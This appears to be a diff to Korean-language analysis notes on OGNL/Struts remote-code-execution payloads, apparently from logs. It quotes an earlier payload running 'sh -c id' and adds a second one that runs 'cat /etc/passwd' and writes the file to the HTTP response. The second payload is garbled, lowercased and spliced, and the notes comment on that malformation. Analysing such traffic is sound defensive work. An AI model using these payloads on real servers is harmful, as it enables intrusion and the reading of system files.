@@ -20,3 +20,12 @@ redirect:${#a\=(newjava.lang.processbuilder(newjava.lang.string[]{'sh','-c','id'
 * OGNL/Java 문법상 `new java.lang.ProcessBuilder(...)` 와 같이 공백·정확한 대소문자가 필요합니다.
 * `getinputstream` vs `getInputStream`, `inputstreamreader` vs `InputStreamReader` 등 카멜케이스(띄어쓰기를 하지 않고 각 단어의 첫 글자를 대문자로 붙여 쓰되, 전체 단어의 첫 글자는 대문자 또는 소문자로 쓸 수 있는 방식)가 존재해서는 안 됩니다. 
 
+---
+
+# 2) ⏳
+
+```
+%{#a\=(newjava.lang.processbuilder(newjava.lang.string[]{"cat","/etc/passwd"})).redirecterrorstream(true).start(),#b\=#a.getinputstream(),#c\=newjava.io.inputstreamreader(#b),#d\=newjava.io.bufferedreader(#c),#e\=newchar[50000],#d.read(#e),#f\=#context.get("com.opensymphony.xwork2.dispatcher.httpservletresponse"),#f.getwriter().println(newjava.lang.string(#e)),#f.getwriter().flush(),#f.getwriter().close()},ProcessBuilder(newjava.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b\=#a.getInputStream(
+```
+
+* OGNL/Struts RCE 변형입니다. `cat /etc/passwd`를 실행해 시스템 파일을 노출시키려는 시도이며, `%{...}` 표기 역시 Struts에서 OGNL 표현식을 감쌀 때 종종 보이는 형식입니다.
